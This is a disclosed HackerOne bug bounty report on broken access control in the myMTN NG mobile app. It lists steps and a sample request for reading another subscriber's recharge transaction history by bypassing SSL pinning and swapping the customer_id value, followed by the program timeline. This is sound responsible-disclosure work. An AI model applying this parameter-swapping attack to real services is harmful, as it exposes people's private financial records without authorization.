---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2025-03-02
submitted: 2024-09-27T17:39:30.829Z
bounty_usd: null
votes: 76
cve: []
program: "[[programs/mtn_group|MTN Group]]"
reporter: "hafiz-ng"
source: "https://hackerone.com/reports/2746709"
title: "Broken Access Control leads to disclosure of transaction history via /v2/rechargeTransactionHistory endpoint"
---
# Broken Access Control leads to disclosure of transaction history via /v2/rechargeTransactionHistory endpoint

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 76 | **Program:** MTN Group | **Disclosed:** 2025-03-02

- Report: [https://hackerone.com/reports/2746709](https://hackerone.com/reports/2746709)
- CWE: N/A
- Submitted: 2024-09-27T17:39:30.829Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

An API endpoint discovered on the MyMTN NG mobile app fails to adequately enforce authorization and authentication mechanisms. Essentially, it allows a bad actor to access the transaction history details for other victims which include `rechargeDate`,  `amountAfter`,  `amountBefore` and `transactionId` due to an insufficient authorization check. 

## Steps To Reproduce:
  1. Log into the **myMTN NG** mobile app.
  2. Set up your proxy tool to intercept the mobile API traffic and bypass the SSL pinning mechanism.
  3. Visit the **transaction history** section within the app and intercept the request with your proxy tool.
 4. Replace the `customer_id` field to any arbitrary MTN number to disclose transaction details of the victim.

## Supporting Material/References:
{█████████}

**Request to vulnerable endpoint**
```POST /api/v2/rechargeTransactionHistory HTTP/2
Host: ████████
Content-Type: application/json
Access-Control-Allow-Origin: *
Accept: application/json
Authorization: ██████
X-Country-Code: nga
Msisdn-Code: 234
Accept-Encoding: gzip, deflate, br
Accept-Language: en-us
Content-Length: 77
User-Agent: myMTN%20NG/14 CFNetwork/1220.1 Darwin/20.3.0

{"customer_id":"2347032233323","start_date":"██████████","end_date":"█████████"}
```

**Response**
```
{"sequenceNumber":"b5fb6af-bc59-57dd-a","data":[{"rechargeDate":"████","amountAfter":"878190.940000","adjustmentType":"RECHARGE","amountBefore":"828190.940000","subscriberId":"2347032233323","rechargeHistory":[{"payType":"VTU","rechargeAmount":"50000.0","description":"VTU"}],"transaction":"VTU"},{"rechargeDate":"███████","amountAfter":"828190.940000","adjustmentType":"RECHARGE","amountBefore":"778190.940000","subscriberId":"2347032233323","rechargeHistory":[{"payType":"VTU","rechargeAmount":"50000.0","description":"VTU"}],"transaction":"VTU"}],"transaction":"VTU"}],"success":true,"resultCode":"0000","links":[],"resultDescription":"Success","transactionId":"████████141033000481","status":200,"statusCode":200}```

## Impact

The potential impact this vulnerability may have on MTN NG can be summarized as follows:

- The impact of this exposure of PII can be devastating to your company, with fallout ranging from recovery costs to decreased customer trust. 
-  Attackers with access to this private information about a victim can use this information to carryout other nefarious activities.

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **Report New**
- **Report Pending Program Review**
- **2024-10-23** @hafiz-ng: This issue is still not yet remediated. This is a high impact issue and should be given due consideration.
- **Report Triaged**
- **2024-11-20** @h1_analyst_felix: @hafiz-ng,

Could you please confirm if you are still able to reproduce this issue?

Thank you,
@███████
- **2024-12-08** @hafiz-ng: This issue still persists.
- **2024-12-09** @h1_analyst_felix: @hafiz-ng,

Thank you for the confirmation; I've relayed this information to the Program team. It would also be helpful if you could provide a screenshot of your retest.

Thank you,
@█████
- **2024-12-10** @hafiz-ng: Please see previous screenshots. I will not respond to any further requests as this issue is not being treated by the product owners and is still a security risk.
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
